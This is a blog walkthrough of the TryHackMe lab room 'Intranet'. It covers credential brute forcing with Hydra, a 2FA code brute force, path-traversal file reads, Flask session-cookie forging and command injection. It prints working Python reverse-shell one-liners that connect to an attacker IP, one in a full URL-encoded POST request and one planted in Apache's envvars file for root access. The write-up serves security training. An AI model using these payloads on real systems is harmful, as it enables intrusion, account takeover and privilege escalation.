---
title: "THM | Intranet | Medium"
date: 2023-07-18T20:53:16+01:00
draft: false
cover:
    image: "img/intranet/Intranet.png"
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "Intranet"
    caption: "Intranet"
    #relative: false # To use relative path for cover image, used in hugo Page-bundles
tags: ["THM","Medium","Linux","LFI","2FA Bypass","RCE","Hydra","Brute Force"]
categories: ["Web"]
weight: 4 
---

### This post is a walkthrough of the Try Hack Me room [Intranet](https://tryhackme.com/room/securesolacodersintra){style="text-align: center;"}

---

## Intro{style="text-align: center;"}

The web application development company SecureSolaCoders has created their own intranet page. The developers are still very young and inexperienced, but they ensured their boss (Magnus) that the web application was secured appropriately. The developers said, "Don't worry, Magnus. We have learnt from our previous mistakes. It won't happen again". However, Magnus was not convinced, as they had introduced many strange vulnerabilities in their customers' applications earlier.

Magnus hired you as a third-party to conduct a penetration test of their web application. Can you successfully exploit the app and achieve root access?

---

### NMAP Scan

```sh
# Nmap 7.94 scan initiated Sat Jun 24 07:36:20 2023 as: nmap -sVC -T4 -vv -p- -oA nmap/tcp-all 10.10.51.214
Nmap scan report for 10.10.51.214
Host is up, received reset ttl 63 (0.0091s latency).
Scanned at 2023-06-24 07:36:21 IST for 111s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE    REASON         VERSION
7/tcp    open  echo       syn-ack ttl 63
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:0b:6f:e8:24:0d:28:91:8a:57:4d:13:b2:47:d9:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCAEzEgoz8XABqBzA4NqG7tY9tmWdAzscmjgOVkCGnBhiJUH0RZKJwexacXshh7jd+SreQmh+zRzcpwvVifjplBYyGfSk8E3oa8kwgKSGBJmr1YzcG2UvFx0wCwNxzAXbiah40XEmZtybhNSO/jZZSAY9/xs7UPL05Nd2I2VBF06pPPonwfntImq//j1rpcoTCqeNIahMnkcsyNG9F9y6SxISfGjP7j7nTJ0LHctW8zcSwLt9BZxbr8Rl44t2LaH6TtciLf4DxbtOSaIxOGaymmkN4LIeEeuiwKbfLIaaeWsTP4td5lo4CQA9hjLtBbCbNV1vxi6lLGBTRuIN6Ulv2OeeyJ2EEXs2+2ZN68XxrMOSQ6xEQyDi4Qj3ipMzcnNkZdm1PCxlOTZYFPXR8v/KsZf9x09QePReUmkVyvhFtSt059wYbio1EQl8NJXt2XqbQ43eXkDOOnqAuaNZvAq8fGagW7Yw5QD4XpX0BcpUODR7aB6nVH8g7NwsKhOLKKs0=
|   256 9a:84:1c:a3:e3:7a:8f:4a:bb:6e:89:2d:f6:21:d5:f2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCxO7ZoDPVxGbA/eW697KUh+sntYBYAxtkM5shrVbtkjhoS9RrsQhXvnjUOtt0Snvi6FiPcRsghK/ssYYsu3B2Y=
|   256 22:30:9e:17:08:45:9c:a8:73:d3:5a:3c:d7:5b:da:f3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGii5ES9kD5kHbmntC53F2IAzqKMlaTaqSdUkzEV1aYM
23/tcp   open  telnet     syn-ack ttl 63 Linux telnetd
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open  http-proxy syn-ack ttl 63 Werkzeug/2.2.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Sat, 24 Jun 2023 06:36:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Sat, 24 Jun 2023 06:36:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Sat, 24 Jun 2023 06:36:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=6/24%Time=64968EF6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,18A,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.8\.10\r\nDate:\x20Sat,\x2024\x20Jun\x202023\x2006:36:38\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20199\r\nLocation:\x20/login\r\nConnection:\x20close\r\n\r\n<!doctype
SF:\x20html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</title>\n<h1>Red
SF:irecting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\x20automatica
SF:lly\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"/login\">/login</a>\
SF:.\x20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,C7,"HTTP/1\
SF:.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Python/3\.8\.10\r\nDa
SF:te:\x20Sat,\x2024\x20Jun\x202023\x2006:36:38\x20GMT\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nC
SF:ontent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4
SF:,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.
SF:dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=ut
SF:f-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title
SF:>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Mess
SF:age:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BA
SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
SF:od\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,184,
SF:"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\x20Pyt
SF:hon/3\.8\.10\r\nDate:\x20Sat,\x2024\x20Jun\x202023\x2006:36:38\x20GMT\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2020
SF:7\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\
SF:n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20r
SF:equested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x
SF:20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20your\x
SF:20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 24 07:38:12 2023 -- 1 IP address (1 host up) scanned in 111.89 seconds

```

### Ports Of Interest

```text
Discovered open port 21/tcp on 10.10.51.214
Discovered open port 22/tcp on 10.10.51.214
Discovered open port 8080/tcp on 10.10.51.214
Discovered open port 80/tcp on 10.10.51.214
Discovered open port 23/tcp on 10.10.51.214
Discovered open port 7/tcp on 10.10.51.214
```

Checking what the webserver is running on with 'whatweb'. The Webser is using Apache 2.4.41 running on a Ubuntu server.

![Whatweb](/img/intranet/whatweb.png "Whatweb Results")

### Port 21 (FTP)

I tried anonymous credentials for FTP, but this does not work and we cannot login. If we find credentials later, we will try this again.

![FTP Denied](/img/intranet/ftp.png "FTP Access Denied")

### Port 80 (HTTP)

Moving onto port 80 we see the following on the homepage.

![HTTP Port 80](/img/intranet/port80.png "Port 80 Homepage")

The domain name is shown on the homepage message.  Add the hostname to you `/etc/hosts` file. 

### Port 8080 (HTTP)

Port 8080 shows us alogin page, but we have no credentials to try yet.

![Prt 8080 Login](/img/intranet/port8080.png "Port 8080 Login Page")

The site has a `robots.txt`, but only has a message saying 'try harder'. Checking the source code reveals valuable information. It gives us a name Ander and and email `devops@securesolacoders.no`. **Note** if we try incorrect username and passwords on te login page we will see a message saying "Invalid username". This is a good thing because we can use this to verify if we guess a valid username or not. Guessing the default `admin@adminsecuresolacoders.no` doesn't say 'Invalid username', so we can take it that the username is valid.

![Source Code Message"](/img/intranet/source.png "Source Code Message")

![Invalid Message](/img/intranet/invalid.png "Username Validation Message")

So far we have discovered the following usernames and but no passwords yet:

* admin@securesolacoders.no
* anders@securesolacoders.no
* devops@securesolacoders.no

### Info Gathered So Far

* Domain Name
* Logon Page
* Usernames

What we are missing is valid password/s, so it's time to generate our own password list by using common words based off the company name and domain.  I used the following words and used John to create a bigger list.

```text
# Wordlist.txt
securecolacoders
securecolacoders.no
SecureSolaCoders
SecureSolaCoders.no
```

```sh
john --wordlist=wordlist.txt --stdout=22 --rules:KoreLogicRulesAppendCurrentYearSpecial | sort > wordlist.lst
```
Another method to generate a password list is to use this weak password generator online https://zzzteph.github.io/weakpass/generator/.

Using the initial list the John generated I then used Burp Suit Intruder to try brute force the login page, but we see a message telling us that a "Hacking attempt detected", and illegal characters were detected in our passwords.

![Illegal Characters](/img/intranet/illegalchrs.png "Illegal Characters Not Allowed")

### Remove Illegal Character

To remove the illegal characters is used the `sed` command.

```sh
sed -i 's/[#'"'"'&]//g' wordlist.lst
```

Next we now now try brute force the login page with Hydra using the following syntax and arguments. This will keep trying to brute force the login with our clean password list, until we no longer receive the 'Invalid username' message.

```sh
hydra -L usernames.txt -P wordlist.lst SecureSolaCoders.no -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid password" -T 64 -V -f
```

Our password list and Hydra were successful and we now have a valid username and password.

![Brute Force](/img/intranet/brutepass.png "Brute Force Password")

___The username and password are redacted to not ruin the box for those willing to go at it alone!___

Now that we have valid credentials go ahead and login.  You will be greeted with the following message.

![Logged In](/img/intranet/login.png "Logged in Message")

### 2FA Code

Another stumbling block!  In the value field there are four X's, which tells us we are required to enter a four digit code! This means it could be any of the following possibilites `0000-9999`.  Let's generate all these number and try brute force the 2FA.

```sh
for i in {0000..9999}; do echo "_$i" >> passcodes.txt
```

I used Burp Suites Intruder to brute force the code as shown below.

![Brute Payload](/img/intranet/bs_payload.png "Burp Intruder Payload")

Burp Suite Intruder finds the code we require to proceed.

![Code Found](/img/intranet/code.png "2FA Code Found")

Enter the 2FA code to proceed. The next page gives flag 2, a hint and another email /username.

![Flag2](/img/intranet/bypass2fa.png "Flag 2 Found")

* New email / username: `support@securesolacoders.no`

Clicking the 'Internal News' link shows the following page with another email /username but also has an update button to 'Update news feed'

![Internal News](/img/intranet/internal.png "Internal News Link")

Clicking the 'External News' link shows us the following

![External News](/img/intranet/external.png "External News Link")

**New Usernames Gathered from these pages.**

* support@securecolacoders.no
* hiring@securecolacoders.no
* internal@securecolacoders.no
* external@securecolacoders.no

Trying to 'Admin' link only gives us a 'forbidden page' message.

![Forbidden Admin](/img/intranet/forbidden_admin.png "Forbidden Admin Access")

Let's take a closer look at the 'Update News' button found on the internal page with Burp Suite. Capture the request for the button.

![Update Button](/img/intranet/update_button.png "Captured Update Button Press")

The request show parameter called 'news' which is calling 'latest'.  This looks like it could have a Local File Injection vulnerability (LFI). start to manipulate the value afer the `=` sign and try to read files such as `/etc/passwd`

By just url encoding the `../../../../../etc/passwd` we are able to bypass whatever sanitization checks are in place, and are able to read the passwd file.

![LFI Found](/img/intranet/lfi_passwd.png "LFI Is Possible")

From the passwd file we can see two users of interest, Anders and Devops. Both these user have `/usr/bin/bash` at the end of there lines, so we know these users are able to have an interactive shell on the box.

### Using the Hint.

The try Hack Me hint refers to `/proc/cmdline`. Back in Burp Suite change or url encoded command to `../../../../proc/self/cmdline` and send the post request again.  Doing this shows us the last command that was run on the target commandline.

_In Linux, `/proc/self/cmdline` is a special file that provides information about the command-line arguments used to invoke the current process. The /proc directory is a virtual filesystem that exposes various kernel and process-related information in a hierarchical manner. The self directory is a symbolic link to the process ID (PID) of the current process, allowing each process to access its own information._

**Why is `/proc/self/cmdline` useful?**

1. Process Information: It allows a process to access its own command-line arguments, which can be useful for logging, debugging, or self-inspection purposes.

2. Process Monitoring: Process monitoring tools can use this file to capture and analyze the command-line arguments of running processes.

3. Script Interactions: Shell scripts and other programs can read /proc/self/cmdline to determine how a script or process was invoked, enabling conditional behavior based on command-line arguments.

![Proc CMDLINE](/img/intranet/cmdline.png "Proc CMDLINE Output")

From the response the last command was python3 running `/home/devops/app.py` in the devops home folder.

Edit Burp Suite again and read the `/home/devops/app.py` python file. We find the next flag.

![Python App](/img/intranet/app.png "Partial Contents of App.py")

Hint for Flag 4 refers to a secret key. Looking at the 'app.py' once more you can see a key code generator in the source code that expects a for digit number in front of 'secret_key_xxxx'.

![Secret Key](/img/intranet/key.png "Code to Generate Secret Key")

### Third Flag

To generate all possible secret keys we can do this with either Python3 or a simple bash oneliner. I will show both methods below.

### Secret Key

**Python3 Script**

```python
import random
from flask import Flask

app = Flask(__name__)

key = "secret_key_" + str(random.randrange(100000, 999999))
app.secret_key = str(key).encode()

print(app.secret_key.decode())
```

**Bash One Liner**

```sh
for i in {100000..999999}; do echo "secret_key_$i"; done > secretkeys.txt
```

We now have a list of all available secret keys but only one would have been used to encrypt the seesion cookie, and we do not know the key. More brute forcing is required to be able to decrypt the session cookie.  To see have the session cookie is structured we can simply base64 decode it to show the following key value pairs `{'logged_in': True, 'username': 'anders'}`. If we know the secretkey we can re-sign a new session cookie with `{'logged_in': True, 'username': 'admin'}` and get admin access.  To do all this we can use a tool from Github found [here](https://github.com/Paradoxis/Flask-Unsign). Git clone the repository to your Kali box and do the following.

Save your browsers session cookie into a cookie.txt file and begin to brute force the secret key witht the 'flask-unsign.py' script.

```sh
flask-unsign --unsign --cookie < /home/kali/.labs/thm/Intranet/cookie.txt --wordlist /home/kali/.labs/thm/Intranet/secretkey.txt
[*] Session decodes to: {'logged_in': True, 'username': 'anders'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 193024 attempts
'secret_key_292904'
```

Now we have the secret key we need to resign our session cookie and inject it with Burp Suite. 

```sh
flask-unsign --sign --cookie '{"logged_in": True,"username": "admin"}' --secret 'secret_key_292904'
IntcImxvZ2dlZF9pblwiOnRydWUsXCJ1c2VybmFtZVwiOlwiYWRtaW5cIn0i.ZJbZ3A.wwVKUqP_BTn3kl7X7nG0t9esYPA
```
Open Burp Suite set your browser to proxy through Burp. Intercept a page refresh as the currently logged in user Anders. Send the request to Burp Suites Repeater and inject in our new session cookie.

![Inject Cookie](/img/intranet/inject_cookie.png "Injecting New Session Cookie")

If you were successfull you will now be presented with the fourth flag and the 'Admin Dashboard'.

### Fourth Flag

![Admin Dashboard](/img/intranet/admin_dash.png "Logged into the Admin Dashboard")

Back to Reviewing the Source Code for 'app.py' we can see an `os.system` function that we can abuse. If the request is 'POST' and the 'debug' parameter is set the `os.system` command executes.

![OS System Abuse](/img/intranet/os_system.png "Abusing 'OS System'")

Using a post request we should be able to test for code injection. Host a test file on your own box and we will try get the file from the server.

![Test File](/img/intranet/testfile.png "Getting our Test File From the Server")

Back in Burp Suite (with or admin session cookie) modify the Burp Request as follows:
![POST TEST](/img/intranet/debug_test.png "Post Request with Debug Paramter")

As you can see from the screenshot below we do have an rce vulnerability! By using python's os system function we can execute `wget` and contact our own self hosted test file.

![RCE](/img/intranet/rce_test.png "We Have Remote Code Execution")

### Foothold

Okay, now that we know we can execute commands lets modify the request again and this time inject a reverse shell using python.

```text
POST /admin HTTP/1.1
Host: securesolacoders.no:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://securesolacoders.no:8080/home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZJbzow.tC05IGHU4V7TSe4tu1UDnWOZpk8
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 197

debug=python3%20-c%20'import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%2210.11.0.200%22%2C9001))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)'
```
This is what we urlencoded after the debug paramter:

```sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.11.0.200",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

# urlencoded

python3%20-c%20'import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%2210.11.0.200%22%2C9001))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fsh%22)'
```
Before sending our POST payload start a reverse listener on your own box to receive the reverse shell.  I am using 'pwncat-cs' for my listener.

![PWNCAT-CS Listener](/img/intranet/pwncat.png "Listening with 'pwncat-cs'")

As you can see from the screenshot we received the reverse shell on the server and can now grab the user flag in 'user.txt'.

### Manual Enumeration

Listing processes, we can see that the user Anders is running Apache2 which is the website running on port 80.

![Apache2](/img/intranet/apache2.png "Apache2 Running as Anders")

To latterly move to the user Anders we need to upload a php revshell to get a shell as user Anders and browse to http://securesolacoders.no/php-reverse-shell.php` to execute the PHP reverse shell.  Start another listener on another port, I chose 9002 this time and again used 'pwncat-cs'

### Lateral Movement

Now we have a reverse shell as the user Anders we can submit the 'user2.txt' flag and begin enumeration again.

![User 2 Flag](/img/intranet/user2_flag.png "User 2 Flag Found")

Checking if we can run anything with root permissions.

![Sudo Permissions](/img/intranet/sudo_perm.png "Checking Sudo Permissions")

Anders can restart the Apache2 service as root user.

Checking if Anders can write to any files that may be able to allow us to escalate our privileges to the root user.  The screenshot below is the result of the find command.

```sh
find / -writable 2>/dev/null | grep -v proc | cut -d "/" -f 2,3 | sort -u
```
![Find Writable Files](/img/intranet/writeable.png "Find Writable Files")

The folder `/etc/apache2` is writeable and contains a file `envvars`, which is an Apache Environment Variable file.  Read more [Here](https://httpd.apache.org/docs/2.4/env.html)

### Privilege Escalation

Knowing this, we can inject a reverse shell into the `envvars file` and get a shell as root.
I added the following line to the top of the `envvars` file and then restarted the Apache2 service with sudo.
```sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.11.0.200",9003));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```
![Root Shell](/img/intranet/root.png " We are now root")

When restarting the server with sudo permissions, `envvars is called, and we get a reverse shell as user root.

---

### Congratulations{style="text-align: center;"}



![Congratulation](/img/intranet/congrats.png#center "Congratulations")

**You have now rooted the box and submitted all flags to complete the room**

---

